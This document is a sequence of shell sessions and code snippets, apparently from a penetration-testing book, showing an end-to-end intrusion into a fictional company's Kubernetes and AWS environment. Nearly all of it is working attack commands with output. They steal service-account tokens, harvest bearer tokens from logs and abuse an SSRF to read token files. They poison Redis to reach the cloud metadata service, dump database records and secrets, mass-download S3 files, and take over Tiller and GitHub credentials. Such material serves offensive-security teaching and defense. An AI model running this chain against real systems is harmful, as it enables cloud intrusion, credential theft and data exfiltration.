["```\nshell> **env**\n\nKUBERNETES_SERVICE_PORT_HTTPS=443\nKUBERNETES_PORT_443_TCP_PORT=443\nKUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443\n```", "```\nshell> **curl -Lk https://10.100.0.1/api**\n\nmessage: forbidden: User \"system:anonymous\" cannot get path \"/api\",\nreason: Forbidden\n```", "```\nshell> **curl -L http://10.100.0.1:8080**\n(timeout)\n```", "```\n# define a service account\n\napiVersion: v1\nkind: ServiceAccount   # deploy a service account\nmetadata:\n  - name: metrics-ro   # service account's name\n--\n# Bind metrics-ro account to cluster admin role\n\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: manager-binding # binding's name\nsubjects:\n- kind: ServiceAccount\n  name: metrics-ro      # service account's name\n  apiGroup: \"\"\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin # default role with all privileges\n  apiGroup: \"\"\n```", "```\napiVersion: v1\nkind: Pod  # We want to deploy a Pod\nmetadata:\n`--snip--`\nspec:\n  containers:\n    serviceAccountName: metrics-ro\n    - name: nginx   # First container\n`--snip--`\n```", "```\nshell> **mount |grep -i secrets**\ntmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)\n\nshell> **cat /run/secrets/kubernetes.io/serviceaccount/token**\neyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRi...\n```", "```\nshell> **cat /run/secrets/kubernetes.io/serviceaccount/token \\**\n**| cut -d \".\" -f 2 \\**\n**| base64 -d**\n\n{\n\"iss\": \"kubernetes/serviceaccount\",\n\n\"kubernetes.io/serviceaccount/namespace\": \"prod\",\n\n\"kubernetes.io/serviceaccount/secret.name\": \"default-token-2mpcg\",\n\n\"kubernetes.io/serviceaccount/service-account.name\": \"default\",\n\n\"kubernetes.io/serviceaccount/service-account.uid\": \"956f6a5d-0854-11ea-9d5f-06c16d8c2dcc\",\n\n\"sub\": \"system:serviceaccount:prod:default\"\n}\n```", "```\nshell> **export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)**\n\nshell> **curl -Lk https://10.100.0.1/api --header \"Authorization: Bearer $TOKEN\"**\n\n \"kind\": \"APIVersions\",\n  \"versions\": [\"v1\"],\n  \"serverAddressByClientCIDRs\": [{\n    \"clientCIDR\": \"0.0.0.0/0\",\n    \"serverAddress\": \"ip-10-0-34-162.eu-west-1.compute.internal:443\"\n  }]\n```", "```\nshell> **curl -Lk https://10.100.0.1/version --header \"Authorization: Bearer $TOKEN\"**\n{\n    \"major\": \"1\",\n    \"minor\": \"14+\",\n    \"gitVersion\": \"v1.14.6-eks-5047ed\",\n    \"buildDate\": \"2019-08-21T22:32:40Z\",\n    \"goVersion\": \"go1.12.9\",\n`--snip--`\n}\n```", "```\nshell> **wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl**\n\nshell> **chmod +x kubectl && ./kubectl version**\n\nServer Version: version.Info {Major:\"1\", Minor:\"14+\", GitVersion:\"v1.14.6-eks-5047ed\"...\n```", "```\nshell> ./**kubectl version auth can-i get nodes**\nno\nshell> ./**kubectl version auth can-i get pods**\nyes\n```", "```\nshell> **./kubectl get pods**\nError from server (Forbidden): pods is forbidden: User \"system:serviceaccount:prod:default\" cannot list resource \"pods\" in\nAPI group \"\" in the namespace \"default\"\n```", "```\nshell> ./**kubectl get pods -n prod**\n\nstats-deployment-41de-4jxa1     1/1 Running   0    13h51m\n\nredis-depl-69dc-0vslf           1/1 Running   0    21h43m\n\nssp-elastic-depl-3dbc-3qozx     1/1 Running   0    14h39m\n\nssp-feeder-deployment-13fe-3evx 1/1 Running   0    10h18m\n\napi-core-deployment-d34c-7qxm   1/1 Running   0    10h18m\n`--snip--`\n```", "```\nshell> **./kubectl get pods -n prod -o yaml > output.yaml**\nshell> **head -100 output.yaml**\n\n`--snip--`\nspec:\n  containers:\n  - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/api-core\n    name: api-core\n  - env:\n    - name: DB_CORE_PASS\n      valueFrom:\n        secretKeyRef:\n          key: password\n          name: dbCorePassword\n    volumeMounts:\n    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount\n      name: apicore-token-2mpcg\n      readOnly: true\n  nodeName: ip-192-168-162-215.eu-west-1.compute.internal\n  hostIP: 192.168.162.215\n  phase: Running\n  podIP: 10.0.2.34\n`--snip--`\n```", "```\nshell> **./kubectl get pods -o=\"custom-columns=\\**\n**NODE:.spec.nodeName,\\**\n**POD:.metadata.name\"**\n\nNODE                       POD\nip-192-168-162-215.eu-...  api-core-deployment-d34c-7qxm\nip-192-168-12-123.eu-...   ssp-feeder-deployment-13fe-3evx\nip-192-168-89-110.eu-...   redis-depl-69dc-0vslf\nip-192-168-72-204.eu-...   audit-elastic-depl-3dbc-3qozx\n```", "```\nshell> **./** **kubectl get pods -o=\"custom-columns=\\**\n**NODE:.spec.nodeName,\\**\n**POD:.metadata.name,\\**\n**PODIP:.status.podIP,\\**\n**SERVICE:.spec.serviceAccount,\\**\n**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\\**\n**FILESECRET:.spec.volumes[*].secret.secretName\"**\n\nNODE       POD       PODIP       SERVICE    ENV           FILESECRET\nip-192...  api-...   10.0.2...   api-token  dbCore...     api-token-...\nip-192...  ssp-f...  10.10...    default    dbCass...     default-...\nip-192...  ssp-r...  10.0.3...   default    <none>        default-...\nip-192...  audit...  10.20...    default    <none>        default-...\nip-192...  nexus...  10.20....   default    <none>        deploy-secret...\n```", "```\nNODE       ip-192-168-162-215.eu-west-1.compute.internal\nPOD        creative-scan-depl-13dd-9swkx\nPODIP      10.20.98.12\nPORT       5000\nSERVICE    default\nENV        AWS_SCAN_ACCESSKEY, AWS_SCAN_SECRET\nFILESECRET default-token-2mpcg\n```", "```\nNODE       ip-192-168-72-204.eu-west-1.compute.internal\nPOD        audit-elastic-depl-3dbc-3qozx\nPODIP      10.20.86.24\nPORT       9200\nSERVICE    default\nENV.       <none>\nFILESECRET default-token-2mpcg\n```", "```\nshell> **curl \"10.20.86.24:9200/_cat/indices?v\"**\n\nhealth index id                          size\nyellow test  CX9pIf7SSQGPZR0lfe6UVQ...   4.4kb\nyellow logs  dmbluV2zRsG1XgGskJR5Yw...   154.4gb\nyellow dev   IWjzCFc4R2WQganp04tvkQ...   4.4kb\n```", "```\nshell> **curl \"10.20.86.24:9200/log/_search?pretty&size=4\"**\n\n\"hits\": [{\n`--snip--`\n  \"_source\": {\n1 \"source\": \"dashboard-7654-1235\",\n  \"level\": \"info\",\n2 \"message\": \"GET /api/dashboard/campaign...\\n\n  Host: api-core\\nAuthorization Bearer 9dc12d279fee485...\",\n  \"timestamp\": \"2019-11-10T14:34:46.648883\"\n}}]\n```", "```\nshell> **curl \"10.20.86.24:9200/log/_search?pretty&size=12&q=message:Authorization\"**\n\n\"_timestamp\": 1600579234\n\"message\": \"...Host: api-core\\nAuthorization Bearer 8b35b04bebd34c1abb247f6baa5dae6c...\"\n\n\"_timestamp\": 1600581600\n\"message\": \"...Host: api-core\\nAuthorization Bearer 9947c7f0524965d901fb6f43b1274695...\"\n`--snip--`\n```", "```\nshell> **kubectl get pods -o wide | grep \"api-core\"**\n\nNODE     ip-192-168-162-215.eu-west-1.compute.internal\nPOD      api-core-deployment-d34c-7qxm\nPODIP    10.0.2.34\nPORT     8080\n```", "```\nshell> **curl http://10.0.2.34/api/dashboard/campaign/1395412512 \\**\n**-H \"Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c\"**\n{\n   \"progress\": \"0.3\",\n   \"InsertionID\": \"12387642\",\n   \"creative\": \"s4d.mxrads.com/7bcdfe206ed7c1159bb0152b7/...\",1\n   \"capping\": \"40\",\n   \"bidfactor\": \"10\",\n`--snip--`\n```", "```\nroot@Point1:/# **getent -t hosts s4d.mxrads.com**\n13.225.38.103   s4d.mxrads.com.s3.amazonaws.com\n```", "```\nshell> **curl \"http://10.0.2.34/api/randomPath\" \\**\n**-H \"Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c\"**\n\n{\"level\":\"critical\",\"message\":\"Path not found. Please refer to the docs\n(/docs/v3) for more information\"...\n```", "```\nshell> **curl http://10.0.2.34/usage-report/generate\"**\n**-H \"Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c\"**\n{\n \"status\": \"success\",\n    \"report\": \"api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4               .html\"\n}\n\nshell> **curl api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4.html**\n\n`--snip--`\nInternal configuration:\nLatency metrics:\nEnvironment:\nPATH_INFO: '/usage-report'\nPWD '/api/'\nSHELL '/bin/bash/'\n\nAWS_ROLE_ARN 'arn:aws:iam::886477354405:role/api-core.ec2'1 \n\nAWS_WEB_IDENTITY_TOKEN_FILE '/var/run/secrets/eks.amazonaws.com/serviceaccount/token'2 \n\nDB_CORE_PASS **********\nDB_CORE_USER **********\nDBENDPOINT=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com 3 \n`--snip--`\n```", "```\nshell> **curl api-core/usage-report/file?download=\\**\n**file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token**\n\neyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRiOGNjY2UzNjBiYzFjZGMwYWY4Zm...\n```", "```\n{\n1 \"aud\": [\"sts.amazonaws.com\"],\n  \"exp\": 1574000351,\n2 \"iss\": \"https://oidc.eks.eu-west-1.amazonaws.com/id/4BAF8F5\",\n  \"kubernetes.io\": {\n    \"namespace\": \"prod\",\n`--snip--`\n    \"serviceaccount\": {\n      \"name\": \"api-core-account\",\n      \"uid\": \"f9438b1a-087b-11ea-9d5f-06c16d8c2dcc\"\n    }\n  \"sub\": \"system:serviceaccount:prod:api-core-account\"\n}\n```", "```\nroot@Pointer1:/# **AWS_ROLE_ARN=\"arn:aws:iam::886477354405:role/api-core.ec2\"**\nroot@Pointer1:/# **TOKEN =\"ewJabazetzezet...\"**\n\nroot@Pointer1:/# **aws sts assume-role-with-web-identity \\**\n**--role-arn $AWS_ROLE_ARN \\**\n**--role-session-name sessionID \\**\n**--web-identity-token $TOKEN \\**\n**--duration-seconds 43200**\n\n{\n    \"Credentials\": {\n        \"SecretAccessKey\": \"YEqtXSfJb3lHAoRgAERG/I+\",\n        \"AccessKeyId\": \"ASIA44ZRK6WSYXMC5YX6\",\n        \"Expiration\": \"2019-10-30T19:57:41Z\",\n        \"SessionToken\": \"FQoGZXIvYXdzEM3...\"\n    },\n`--snip--`\n}\n```", "```\nroot@Pointer1:/# **aws s3api list-buckets**\n{\n  \"Buckets\": [\n     {\n       \"Name\": \"mxrads-terraform\",\n       \"CreationDate\": \"2017-10-25T21:26:10.000Z\"\n\n       \"Name\": \"mxrads-logs-eu\",\n       \"CreationDate\": \"2019-10-27T19:13:12.000Z\"\n\n       \"Name\": \"mxrads-db-snapshots\",\n       \"CreationDate\": \"2019-10-26T16:12:05.000Z\"\n`--snip--`\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-terraform**\n\nAn error occurred (AccessDenied) when calling the ListObjectsV2 operation:\nAccess Denied\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_creatives.txt**\nroot@Point1:~/# **head list_creatives.txt**\n{\"Contents\": [{\n  \"Key\": \"2aed773247f0203d5e672cb/125dad49652436/vid/720/6aa58ec9f77af0c0ca497f90c.mp4\",\n\n  \"LastModified\": \"2015-04-08T22:01:48.000Z\",\n`--snip--`\n```", "```\nshell> **export TOKEN=\"ewJabazetzezet...\"**\nshell> **curl -Lk \\**\n**https://10.100.0.1/api/v1/namespaces/prod/secrets/dbCorepassword \\**\n**--header \"Authorization: Bearer $TOKEN\"**\n{\n    \"kind\": \"Secret\",\n    \"data\": {\n      \"user\": \"YXBpLWNvcmUtcnc=\",\n      \"password\": \"ek81akxXbGdyRzdBUzZs\" }}\n```", "```\nroot@Point1:~/# **echo YXBpLWNvcmUtcnc= |base64 -d**\napi-core-rw\nroot@Point1:~/# **echo ek81akxXbGdyRzdBUzZs |base64 -d**\nzO5jLWlgrG7AS6l\n```", "```\nshell> **export DBSERVER=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com**\n\nshell> **apt install -y mysql-client**\nshell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e \"Show databases;\"**\n\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| test               |\n| campaigns          |\n| bigdata            |\n| taxonomy           |\n--snip--\n```", "```\nshell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l -e\\**\n**\"select COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA,TABLE_CATALOG from information_schema.columns;\"**\n+----------------------+--------------------+--------------+\n| COLUMN_NAME          | TABLE_NAME         | TABLE_SCHEMA |\n+----------------------+--------------------+--------------+\n| counyter             | insertions         | api          |\n| id_entity            | insertions         | api          |\n| max_budget           | insertions         | api          |\n`--snip--`\n```", "```\nshell> **mysql -h $DBSERVER -u api-core-rw -pzO5jLWlgrG7AS6l campaigns -e\\**\n**\"select ee.name, pp.email, pp.hash, ii.creative, ii.counter, ii.max_budget\\**\n**from insertions ii\\**\n**inner join entity ee on ee.id= ii.id_entity\\**\n**inner join profile pp on pp.id_entity= ii.id_entity\\**\n**where ee.name like '%gretsch%'\"**\n\n---\nName : Gretsch Politico\nEmail: eloise.stinson@gretschpolitico.com\nHash: c22fe077aaccbc64115ca137fc3a9dcf\nCreative: s4d.mxrads.com/43ed90147211803d546734ea2d0cb/\n12adad49658582436/vid/720/88b4ab3d165c1cf2.mp4\nCounter: 16879\nMaxbudget: 250000\n---\n`--snip--`\n```", "```\nroot@Point1:~/creatives# **cat list_creatives.txt | \\**\n**xargs -I @ aws s3api get-object \\**\n**-P 16 \\**\n**--bucket s4d.mxrads.com \\**\n**--key @ \\**\n**$RANDOM**\n```", "```\nroot@Point1:~/creatives# **ls -l |wc -l**\n264\n```", "```\nshell> **./kubectl get pods -n prod -o=\"custom-columns=\\**\n**NODE:.spec.nodeName,\\**\n**POD:.metadata.name\"**\n\nNODE                         POD\nip-192-168-133-105.eu-...    vast-check-deployment-d34c-7qxm\nip-192-168-21-116.eu-...     ads-rtb-deployment-13fe-3evx\nip-192-168-86-120.eu-...     iab-depl-69dc-0vslf\nip-192-168-38-101.eu-...     cpm-factor-depl-3dbc-3qozx\n`--snip--`\n```", "```\nspec:\n    containers:\n    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/ads-rtb\n`--snip--`\n    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/redis-rtb\n      name: rtb-cache-mem\n      ports:\n      - containerPort: 6379\n        protocol: TCP\n    nodeName: ip-192-168-21-116.eu-west-1.compute.internal\n    hostIP: 192.168.21.116\n    podIP: 10.59.12.47\n```", "```\nshell> **apt install redis-tools**\n\nshell> **redis -h 10.59.12.47 --scan * > all_redis_keys.txt**\n\nshell> **head -100 all_redis_keys.txt**\nvast_c88b4ab3d_19devear\nselect_3799ec543582b38c\nvast_5d3d7ab8d4\n`--snip--`\n```", "```\nshell> **redis -h 10.59.12.47 get select_3799ec543582b38c**\n\nAAVzcgA6Y29tLm14cmFkcy5ydGIuUmVzdWx0U2V0JEJpZFJlcXVlc3SzvY...\n\nshell> **echo -ne AAVzcgA6Y29tLm14cmFkcy5ydGI...| base64 -d | xxd**\n\naced **0005 7372** 003a 636f 6d2e 6d78 7261  ......sr.:com.mxra\n6473 2e72 7462 2e52 6573 756c 7453 6574  ds.rtb.ResultSet$B\n2442 6964 5265 7175 6573 74b3 bd8d d306  $BidRequest.......\n091f ef02 003d dd...\n```", "```\n// Retrieve serialized object from Redis\nbyte[] data = FetchDataFromRedis()\n// Create an input stream\nByteArrayInputStream bis = new ByteArrayInputStream(data);\n```", "```\n// Create a generic Java object from the stream\nObjectInputStream ois = new ObjectInputStream(bis);\n\n// Calling readObject of the bidRequest class to format/prepare the raw data\nBidRequest objectFromRedis = 1(BidRequest)ois.readObject();\n```", "```\n// BidRequest is a class that can be serialized\nclass BidRequest implements Serializable{\n    public String auctionID;\n    private void readObject(java.io.ObjectInputStream in){\n       in.defaultReadObject();\n       this.auctionID = this.auctionID.toLowerCase();\n       // Perform more operations on the object attributes\n    }\n}\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt**\nroot@Point1:~/# **grep 'commons-collections' list_objects_dl.txt**\n\nKey: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2\n`--snip--`\n```", "```\nshell> **head -100 all_redis_keys.txt**\nvast_c88b4ab3d_19devear\nselect_3799ec543582b38c\n`vast_c88b4ab3d_19devear`\n`--snip--`\n```", "```\nshell> **redis -h 10.59.12.47 get vast_c88b4ab3d_19devear**\nhttps://www.goodadsby.com/vast/preview/9612353\n```", "```\n<VAST version=\"3.0\">\n<Ad id=\"1594\">\n  <InLine>\n    <AdSystem>MXR Ads revolution</AdSystem>\n    <AdTitle>Exotic approach</AdTitle>\n`--snip--`\n    <MediaFile id=\"134130\" type=\"video/mp4\" \n        bitrate=\"626\" width=\"1280\" height=\"720\">\n       http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4\n`--snip--`\n```", "```\nshell> **redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\\**\n**http://169.254.169.254/latest/meta-data/iam/info**\nOK\n```", "```\nshell> **curl \"10.20.86.24:9200/log/_search?pretty&size=10&q=message: 886371554408\"**\n\n\"level\": \"Critical\"\n\"message\": \"...\\\"InstanceProfileArn\\\" : \n\\\" arn:aws:iam::886477354405:instance-profile/eks-workers-prod-common-NodeInstanceProfile-\nBZUD6DGQKFGC\\\"...org.xml.sax.SAXParseException...Not valid XML file\"\n```", "```\nshell> **redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\\**\n**http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC**\nOK\n```", "```\nshell> **curl \"10.20.86.24:9200/log/_search?pretty&size=10&q=message: AccessKeyId\"**\n\n\"level\": \"Critical\"\n\"message\": \"...\\\"AccessKeyId\\\" : \\\"ASIA44ZRK6WS3R64ZPDI\\\", \\\"SecretAccessKey\\\" :\n\\\"+EplZs...org.xml.sax.SAXParseException...Not valid XML file\"\n```", "```\nroot@Point1:~/# **vi ~/.aws/credentials**\n[node]\naws_access_key_id = ASIA44ZRK6WS3R64ZPDI\naws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ\naws_session_token = AgoJb3JpZ2luX2...\n\nroot@Point1:~/# **aws ec2 describe-instances \\**\n**--region=eu-west-1 \\**\n**--profile node**\n`--snip--`\n\"InstanceId\": \"i-08072939411515dac\",\n\"InstanceType\": \"c5.4xlarge\",\n\"KeyName\": \"kube-node-key\",\n\"LaunchTime\": \"2019-09-18T19:47:31.000Z\",\n\"PrivateDnsName\": \"ip-192-168-12-33.eu-west-1.compute.internal\",\n\"PrivateIpAddress\": \"192.168.12.33\",\n\"PublicIpAddress\": \"34.245.211.33\",\n\"StateTransitionReason\": \"\",\n\"SubnetId\": \"subnet-00580e48\",\n\"Tags\": [\n  {\n  \"Key\": \"k8s.io/cluster-autoscaler/prod-euw1\",\n  \"Value\": \"true\"\n  }],\n`--snip--`\n```", "```\nroot@Point1:~/# **export AWS_REGION=eu-west-1**\nroot@Point1:~/# **aws eks describe-cluster --name prod-euw1 --profile node**\n{  \"cluster\": {\n  1 \"endpoint\": \"https://BB061F0457C63.yl4.eu-west-1.eks.amazonaws.com\",\n  2 \"roleArn\": \"arn:aws:iam::886477354405:role/eks-prod-role\",\n    \"vpcId\": \"vpc-05c5909e232012771\",\n    \"endpointPublicAccess\": false,\n    \"endpointPrivateAccess\": true,\n`--snip--`\n```", "```\nroot@Point1:~/# **aws eks get-token --cluster-name prod-euw1 --profile node**\n{\n    \"kind\": \"ExecCredential\",\n    \"apiVersion\": \"client.authentication.k8s.io/v1alpha1\",\n    \"status\": {\n        \"expirationTimestamp\": \"2019-11-14T21:04:23Z\",\n        \"token\": \"k8s-aws-v1.aHR0cHM6Ly9zdHMuYW1hem...\"\n    }\n}\n```", "```\nroot@Point1:~/# **aws eks get-token --cluster-name prod-euw1 \\**\n**| jq -r .status.token \\**\n**| cut -d\"_\" -f2 \\**\n**| base64 -d \\**\n**| sed \"s/&/\\n/g\"**\n\nhttps://sts.amazonaws.com/?Action=GetCallerIdentity\n&Version=2011-06-15\n&X-Amz-Algorithm=AWS4-HMAC-SHA256\n&X-Amz-Credential=ASIA44ZRK6WSYQ5EI4NS%2F20191118/us-east-1/sts/aws4_request\n&X-Amz-Date=20191118T204239Z\n&X-Amz-Expires=60\n&X-Amz-SignedHeaders=host;x-k8s-aws-id\n&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX/////...\n```", "```\nroot@Point1:~/# **aws eks update-kubeconfig --name prod-euw1 --profile node**\n\nUpdated context arn:aws:eks:eu-west-1:886477354405:cluster/prod-euw1 in /root/.kube/config\nshell> **wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config**\n\nshell> **mkdir -p /root/.kube && cp config /root/.kube/**\n```", "```\nshell> **kubectl get pods -n kube-system**\n\nNAME                       READY   STATUS    RESTARTS   AGE\naws-node-hl227             1/1     Running   0          82m\naws-node-v7hrc             1/1     Running   0          83m\ncoredns-759d6fc95f-6z97w   1/1     Running   0          89m\ncoredns-759d6fc95f-ntq88   1/1     Running   0          89m\nkube-proxy-724jd           1/1     Running   0          83m\nkube-proxy-qtc22           1/1     Running   0          82m\n`--snip--`\n```", "```\nshell> **kubectl get secrets --all-namespaces**\n\nError from server (Forbidden): secrets is forbidden:\nUser \"system:node:ip-192-168-98-157.eu-west-1.compute.internal\" cannot list\nresource \"secrets\" in API group \"\" at the cluster scope: can only read\nnamespaced object of this type\n```", "```\nshell> **kubectl get pods --all-namespaces --field-selector\\**\n**spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal**\n\nprod    ads-rtb-deployment-13fe-3evx   1/1  Running\nprod    ads-rtb-deployment-12dc-5css   1/1  Running\nprod    kafka-feeder-deployment-23ee   1/1  Running\nstaging digital-elements-deploy-83ce   1/1  Running\ntest    flask-deployment-5d76c-qb5tz   1/1  Running\n`--snip--`\n```", "```\nshell> .**/kubectl get pods -o=\"custom-columns=\\**\n**NS:.metadata.namespace,\\**\n**POD:.metadata.name,\\**\n**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\\**\n**FILESECRET:.spec.volumes[*].secret.secretName\" \\**\n**--all-namespaces \\**\n**--field-selector spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal**\n\nNS       POD             ENV                FILESECRET\nprod     kafka...        awsUserKafka       kafka-token-653ce\nprod     ads-rtb...      CassandraDB        default-token-c3de\nprod     ads-rtb...      CassandraDB        default-token-8dec\nstaging  digital...      GithubBot          default-token-88ff\ntest     flask...        AuroraDBTest       default-token-913d\n`--snip--`\n```", "```\nshell> **./kubectl get secret awsUserKafka  -o json -n prod \\**\n**| jq .data**\n  \"access_key_id\": \"AKIA44ZRK6WSSKDSKQDZ\",\n  \"secret_key_id\": \"93pLDv0FlQXnpyQSQvrMZ9ynbL9gdNkRUP1gO03S\"\n\nshell> **./kubectl get secret githubBot -o json -n staging\\**\n**|jq .data**\n  \"github-bot-ro\": \"9c13d31aaedc0cc351dd12cc45ffafbe89848020\"\n\nshell> **./kubectl get secret kafka-token-653ce -n prod -o json | jq -r .data.token**\n\"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZ...\n```", "```\nshell> **./kubectl get pods -o=\"custom-columns=\\**\n**NS:.metadata.namespace,\\**\n**POD:.metadata.name,\\**\n**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\\**\n**FILESECRET:.spec.volumes[*].secret.secretName\" \\**\n**--all-namespaces \\**\n**--field-selector spec.nodeName=ip-192-168-133-34.eu-west-1.compute.internal**\n\nNS              POD             ENV            FILESECRET\n1 kube-system     tiller          <none>         tiller-token-3cea\nprod            ads-rtb...      CassandraDB    default-token-99ed\n```", "```\nroot@Point1:~/# **aws eks update-kubeconfig --name prod-euw1 --profile node133**\n`--snip--`\nshell> **./kubectl get secret tiller-token-3cea \\**\n**-o json \\**\n**--kubeconfig ./kube/config_133_34 \\**\n**| jq -r .data.token**\n\nZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZXlKcGMzTWlPaU...\n```", "```\nshell> **kubectl get secrets \\**\n**--all-namespaces \\**\n**-o json \\**\n**--kubeconfig ./kube/tiller_config**\n\n\"abtest_db_user\": \"abtest-user-rw\",\n\"abtest_db_pass\": \"azg3Wk+swUFpNRW43Y0\",\n\"api_token\": \"dfb87c2be386dc11648d1fbf5e9c57d5\",\n\"ssh_metrics\": \"--- BEGIN SSH PRIVATE KEY --- ...\"\n\"github-bot-ro\": \"9c13d31aaedc0cc351dd12cc45ffafbe89848020\"\n```", "```\nroot@Point1:~/# **vi ~/.aws/credentials**\n[kevin]\naws_access_key_id = AKIA44ZRK6WSSKDSKQDZ\naws_secret_access_key = 93pLDv0FlQXnpy+EplZsWmW/5r/+B/+KJ\n\nroot@Point1:~/# **aws iam get-user --profile kevin**\n \"User\": {\n    \"Path\": \"/\",\n    \"UserName\": \"kevin.duncan\",\n    \"Arn\": \"arn:aws:iam::886371554408:user/kevin.duncan\",\n```", "```\nroot@Point1:~/# **python3 -m pip install PyGithub**\nroot@Point1:~/# **python3**\n\n>>> **from github import Github**\n>>> **g = Github(\"9c13d31aaedc0cc351dd12cc45ffafbe89848020\")**\n>>> **print(g.get_user().name)**\nmxrads-bot-ro\n```"]